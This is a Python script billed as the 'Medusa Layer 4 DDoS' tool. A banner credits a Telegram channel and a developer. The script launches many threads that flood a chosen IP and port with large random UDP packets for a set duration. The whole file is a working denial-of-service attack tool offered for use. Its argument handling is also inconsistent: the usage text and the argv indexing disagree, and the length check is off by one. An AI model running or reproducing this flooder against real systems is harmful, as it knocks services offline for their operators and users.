import socket
import sys, os
import threading
import time
import random

if len(sys.argv) < 5:
  print("""\033[0m



\033[0m           █▀▄▀█ █▀▀ █▀▀▄ █──█ █▀▀ █▀▀█ \033[31m █▀▀▄ █▀▀▄ █▀▀█ █▀▀ 
\033[0m           █─▀─█ █▀▀ █──█ █──█ ▀▀█ █▄▄█ \033[31m █──█ █──█ █──█ ▀▀█ 
\033[0m           ▀───▀ ▀▀▀ ▀▀▀─ ─▀▀▀ ▀▀▀ ▀──▀ \033[31m ▀▀▀─ ▀▀▀─ ▀▀▀▀ ▀▀▀     
\033[33m       ╚═════════╦══════════════════════════════════╦═════════╝
\033[33m       ╔═════════╩══════════════════════════════════╩═════════╗
\033[33m       ║            Welcome To \033[31mMedusa Layer 4 DDoS            \033[33m║
\033[33m       ║      \x1b[38;2;255;20;147m►► \033[0mThis tool for Layer 4 Attack \033[31m(\033[0mUDP \033[31m& \033[0mTCP\033[31m)     \033[33m║
\033[33m       ║           Telegram \x1b[38;2;255;20;147m: \033[32mhttps://t.me/RipperSec          \033[33m║
\033[33m       ║                 Developer \x1b[38;2;255;20;147m: \033[0mTrashDono                \033[33m║
\033[33m       ╚══════════════════════════════════════════════════════╝
\033[0m""")
  sys.exit("\x1b[38;2;255;20;147m►► \033[0mUsage\x1b[38;2;255;20;147m: \033[0mpython3 \033[33mMedusaL4 \033[0m<\033[32mtimes\033[0m> <\033[32mip\033[0m> <\033[32mport\033[0m> <\033[32mpacket\033[0m> <\033[32mthreads\033[0m>")

print("\x1b[31m[\x1b[33mMedusa\x1b[31m] \x1b[0mAttack Started!")
ip = str(sys.argv[1])
port = int(sys.argv[2])
packet = int(sys.argv[3])
threads = int(sys.argv[4])
times = float(sys.argv[5])

timeout = time.time() + 1 * times

def udp(ip, port, packet, times):
  timeout = time.time() + 1 * times
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
  print(f"\x1b[31m[\x1b[33mMedusa\x1b[31m] \x1b[0mAttacking... \x1b[31m>  \x1b[0mtime \x1b[32m{times} \x1b[0mip \x1b[32m{ip}\x1b[31m:\x1b[32m{port}\x1b[0m packet \x1b[32m{packet}\x1b[0m threads \x1b[32m{threads}\x1b[0m ")
  while time.time() < timeout:
    try:
      try:
        data = random._urandom(int(random.randint(1025, 65505)))
        for _ in range(packet):
          s.sendto(data, (str(ip), int(port)))
      except:
        s.close()
    except:
      s.close()
  print("\x1b[31m[\x1b[33mMedusa\x1b[31m] > \x1b[0mSuccessfully Attack!")

def main():
  global threads
  for _ in range(threads):
    thread = []
    th = threading.Thread(target=udp, args=(ip, port, packet, times))
    thread.append(th)
    th.start()

if __name__ == '__main__':
  try:
    main()
  except KeyboardInterrupt:
    print('\x1b[31m[\x1b[33mMedusa\x1b[31m] \x1b[0mAttack Over!')
    sys.exit()
